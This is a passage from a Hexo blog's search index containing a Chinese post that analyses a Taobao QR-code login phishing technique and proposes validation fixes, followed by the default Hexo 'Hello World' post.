        <category>物联网</category>
      </categories>
      <tags>
        <tag>极客</tag>
        <tag>物联网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于淘宝二维码问题的一些想法]]></title>
    <url>%2F2019%2F03%2F29%2F%E5%85%B3%E4%BA%8E%E6%B7%98%E5%AE%9D%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95%2F</url>
    <content type="text"><![CDATA[今天fb上发了一篇关于淘宝二维码钓鱼的文章，不过该文章估计也快被公关了，暂时甩个还能访问的链接淘宝二维码钓鱼问题原文 大致描述总结下来大概的意思就是如何利用淘口令结合网页扫码登录来进行钓鱼。流程为：使用后端服务自动提取登录二维码的链接->转换成淘口令->散布淘口令->用户复制淘口令后进入淘宝APP->淘宝APP内部转换淘口令后跳转登录授权->用户受骗点击登录->后端服务获取到用户的授权即可登录淘宝。 问题反思一开始看的时候很容易让人以为出问题的是二维码扫描登录，其实并不完全是，因为这本身是一个钓鱼的场景，无论我们如何优化二维码扫描登录也无法避免被用来钓鱼。而让这个场景变得更容易被钓鱼的本身原因应该有下面那么几个： 淘口令生成时候对链接校验不足，本质上还是一个短链接生成服务，虽然有对域名进行校验但是使用URL跳转漏洞可以绕过，那么对于淘口令生成的方面需要加强业务场景的校验，非业务场景的链接应该不予生成。 淘口令在淘宝APP里打开时候没有做严格的场景限定，应该在APP内限制淘口令仅能用来唤起相应的商品或者店铺，而不是跳转到授权登录页。 扫码登录的链接应该只能通过淘宝APP扫码来实现，非该操作都不能通过APP内部逻辑来唤醒，本质上还是对于场景的校验不足。 我个人认为应该按照这么个逻辑来修复这个问题，本质上还是对于钓鱼的场景进行限制即可。没有必要修改二维码扫码登录的协议，最多就是看看还有没有什么加固的空间。当然换句话说，除了淘口令可能被利用以外，如果没有在APP内对于链接唤醒协议的场景做限制，可能还有其他类似的功能也可以被用来做钓鱼。]]></content>
      <categories>
        <category>案例记录与反思</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F03%2F27%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
